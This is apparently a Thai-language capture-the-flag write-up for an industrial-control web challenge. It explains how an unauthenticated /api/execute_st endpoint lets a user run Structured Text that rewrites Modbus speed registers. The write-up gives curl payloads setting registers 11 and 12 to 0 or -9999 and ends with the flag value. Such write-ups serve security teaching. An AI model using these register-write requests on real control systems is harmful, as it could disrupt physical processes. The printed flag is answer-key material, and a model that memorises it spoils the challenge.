@@ -1,0 +1,159 @@
+Write-up: HORSE RACING (OTMedium • 29)
+เป้าหมายของโจทย์
+
+โจทย์ให้เรา “โกงการแข่งขันม้า” ของโรงงาน Archa โดยทำให้ ม้า #1 (ของเรา) วิ่งเข้าเส้นชัยเป็นที่ 1 เพื่อให้ระบบแสดง Flag (รูปแบบ ARCHA{...})
+
+จากโค้ดฝั่งหน้าเว็บ เมื่อม้า #1 ชนะ ระบบจะเรียก GET /api/flag แล้วนำค่าที่ได้มาโชว์บนหน้าเว็บทันที
+
+1) วิเคราะห์จาก Source Code (Client-side)
+
+จาก JavaScript ที่ให้มา เราสรุป flow สำคัญได้ดังนี้
+
+1.1 Race loop ใช้ความเร็วจาก server
+
+ทุกเฟรมของการแข่งขัน หน้าเว็บจะเรียก
+
+GET /api/race_state
+
+แล้วนำค่าความเร็ว (horse1_speed, horse2_speed, horse3_speed) ไปคำนวณระยะทางที่เพิ่มขึ้น:
+
+speedX = horseX_speed * 0.03
+
+horseXPosition += speedX
+
+ดังนั้น “คนที่ความเร็วสูงกว่า” จะวิ่งถึง 100 ก่อนและชนะ
+
+1.2 เงื่อนไขชนะเพื่อได้ Flag
+
+ในฟังก์ชัน showWinner(horseNumber):
+
+ถ้า horseNumber === 1
+→ เรียก GET /api/flag
+→ แสดงค่า flag ใน modal
+
+ถ้าไม่ใช่ #1
+→ แจ้งแพ้และให้ลองแก้ Modbus register
+
+สรุป: ต้องทำให้ม้า #1 ชนะเท่านั้นถึงจะได้ flag
+
+2) จุดที่โจทย์ให้ “เล่น”: Modbus Registers
+
+ในโค้ดมีการอธิบาย Register สำคัญไว้ชัดเจน:
+
+const REGISTER_DESCRIPTIONS = {
+  11: 'Horse #2 Speed',
+  12: 'Horse #3 Speed',
+  50: 'Horse #1 Speed = (50+51+52)/3 [LOCKED]',
+  51: 'Horse #1 Speed Component [LOCKED]',
+  52: 'Horse #1 Speed Component [LOCKED]'
+};
+
+
+สรุป:
+
+Register 11 คุมความเร็ว ม้า #2
+
+Register 12 คุมความเร็ว ม้า #3
+
+Register 50–52 คุมความเร็ว ม้า #1 แต่ถูกล็อก (LOCKED) แก้ตรง ๆ ไม่ได้
+
+ดังนั้นแนวทางที่ง่ายสุดคือ:
+
+ทำให้ม้า #2 และ #3 ช้าลง เพื่อให้ม้า #1 (ค่า default ประมาณ 30) กลายเป็นเร็วที่สุด
+
+3) ช่องทางโจมตี: /api/execute_st
+
+หน้าเว็บมีฟังก์ชัน executeSTCode() ซึ่งส่งคำสั่งไปที่
+
+POST /api/execute_st
+
+Body: { "code": "<Structured Text code>" }
+
+และถ้าสำเร็จจะโชว์ว่าแก้ register อะไรไปบ้าง (registers_modified)
+
+นี่เป็นช่องทางให้เราส่งโค้ด ST เพื่อ “เขียนค่า Modbus register” (เช่น 11, 12)
+
+4) การโจมตี (Kali Linux)
+4.1 ตรวจสอบสถานะเริ่มต้น
+
+ตั้ง IP ของโจทย์:
+
+IP=172.18.0.86
+
+
+ดูค่าความเร็วและ register:
+
+curl -s http://$IP/api/race_state | jq .
+curl -s http://$IP/api/registers  | jq .
+
+
+โดยปกติจะเห็นแนว ๆ:
+
+ม้า #1 ~ 30
+
+ม้า #2 ~ 50
+
+ม้า #3 ~ 45
+ซึ่งหมายความว่า ม้าเราแพ้แน่นอนถ้าไม่แก้ไข
+
+4.2 ส่ง ST code เพื่อทำให้คู่แข่งช้าลง
+
+แนวคิด: ตั้งให้ register 11 = 0 และ register 12 = 0
+
+ตัวอย่าง payload (รูปแบบหนึ่งที่พบบ่อยในโจทย์แนวนี้):
+
+curl -s -X POST http://$IP/api/execute_st \
+  -H 'Content-Type: application/json' \
+  -d '{"code":"REG[11] := 0; REG[12] := 0;"}' | jq .
+
+
+ถ้าระบบรองรับค่าติดลบ (เพราะ type เป็น DINT มักรองรับ signed) สามารถทำให้ชนะชัวร์ขึ้นด้วยการลดให้ติดลบแรง ๆ:
+
+curl -s -X POST http://$IP/api/execute_st \
+  -H 'Content-Type: application/json' \
+  -d '{"code":"REG[11] := -9999; REG[12] := -9999;"}' | jq .
+
+4.3 Verify ว่าแก้สำเร็จ
+
+ตรวจสอบว่า register เปลี่ยนจริง:
+
+curl -s http://$IP/api/registers | jq '."11","12"'
+curl -s http://$IP/api/race_state | jq .
+
+
+คาดหวัง:
+
+horse2_speed ลดลงมาก (0 หรือค่าติดลบ)
+
+horse3_speed ลดลงมาก
+
+horse1_speed เท่าเดิม แต่กลายเป็น “เร็วที่สุด”
+
+5) ได้ Flag
+
+เมื่อม้า #2 และ #3 ช้าลงแล้ว:
+
+กลับไปหน้าเว็บ
+
+กด Start Race
+
+ม้า #1 จะเข้าเส้นชัยเป็นที่ 1
+
+หน้าเว็บเรียก GET /api/flag อัตโนมัติ และโชว์ flag ใน modal
+
+หรือถ้าระบบไม่กันการเรียกตรง (บางโจทย์กันไว้) สามารถลอง:
+
+curl -s http://$IP/api/flag | jq .
+
+
+แต่โดยหลักของโจทย์นี้ flag จะถูกดึง “ตอนชนะ” ผ่านหน้าเว็บอยู่แล้ว
+
+6) สรุปช่องโหว่
+
+ระบบเปิดให้ผู้ใช้ส่งคำสั่ง Structured Text ผ่าน /api/execute_st ได้โดยไม่มีการจำกัดสิทธิ์ที่เพียงพอ
+
+ผู้โจมตีสามารถแก้ Modbus register (11,12) เพื่อปรับความเร็วของคู่แข่งให้ช้าลง
+
+ทำให้ม้า #1 ชนะและเรียก /api/flag ได้สำเร็จ
+
+ARCHA{048b0fe2d1e8349f1198cb592e14268b}
